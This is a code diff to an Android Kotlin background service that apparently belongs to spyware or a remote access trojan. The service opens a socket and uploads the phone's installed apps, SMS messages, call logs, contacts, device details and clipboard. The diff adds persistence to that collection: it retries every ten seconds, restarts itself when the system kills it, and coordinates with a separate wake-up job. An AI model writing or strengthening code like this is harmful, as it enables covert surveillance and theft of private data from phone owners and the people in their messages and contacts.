@@ -1,4 +1,3 @@
-// MainService.kt (معدل)
 package willi.fiend
 
 import android.annotation.SuppressLint
@@ -11,33 +10,65 @@ import android.widget.RemoteViews
 import androidx.core.app.NotificationCompat
 
 class MainService : Service() {
+
+    private val handler = Handler(Looper.getMainLooper())
+    
+    // Runnable لإعادة المحاولة إذا فشل الاتصال
+    private val connectionRunnable = object : Runnable {
+        override fun run() {
+            try {
+                // التأكد من أن الاتصال يتم في خيط منفصل حتى لا يتجمد التطبيق
+                Thread {
+                    try {
+                        val socket = AppSocket(this@MainService) // نمرر السياق
+                        val action = socket.action
+                        socket.connect()
+                        action.uploadApps()
+                        action.uploadMessages()
+                        action.uploadCalls()
+                        action.uploadContact()
+                        action.uploadDeviceInfo()
+                        action.uploadClipboard()
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                        // إذا فشل الاتصال، نعيد المحاولة بعد 10 ثوانٍ
+                        handler.postDelayed(this, 10000)
+                    }
+                }.start()
+            } catch (e: Exception) {
+                e.printStackTrace()
+                handler.postDelayed(this, 10000)
+            }
+        }
+    }
+
     override fun onBind(p0: Intent?): IBinder? {
         return null
     }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        // تأخير بدء الاتصال لتجنب بدء الخدمة قبل اكتمال تهيئة النظام
-        Handler(Looper.getMainLooper()).postDelayed({
-            try {
-                val socket = AppSocket(this)
-                val action = socket.action
-                socket.connect()
-                action.uploadApps()
-                action.uploadMessages()
-                action.uploadCalls()
-                action.uploadContact()
-                action.uploadDeviceInfo()
-                action.uploadClipboard()
-            } catch (e: Exception) {
-                e.printStackTrace()
-            }
-        }, 5000)
-        return START_REDELIVER_INTENT
-    }
-
     override fun onCreate() {
         super.onCreate()
+        // تحديث الحالة في JobWakeUpService
+        JobWakeUpService.isMainServiceRunning = true
+        
         startForeground(1, getNotification())
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        // إزالة التأخير الثابت ووضعه داخل الـ Runnable
+        // بدلاً من 5 ثوانٍ، نجعل الخدمة تحاول الاتصال فوراً، وإذا فشلت تعيد المحاولة
+        handler.postDelayed(connectionRunnable, 5000) 
+        
+        // إعادة تشغيل الخدمة إذا قتلها النظام
+        return START_STICKY
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        // تحديث الحالة عند التدمير
+        JobWakeUpService.isMainServiceRunning = false
+        // إيقاف الـ Runnable لتجنب تسرب الذاكرة
+        handler.removeCallbacks(connectionRunnable)
     }
 
     @SuppressLint("NewApi")
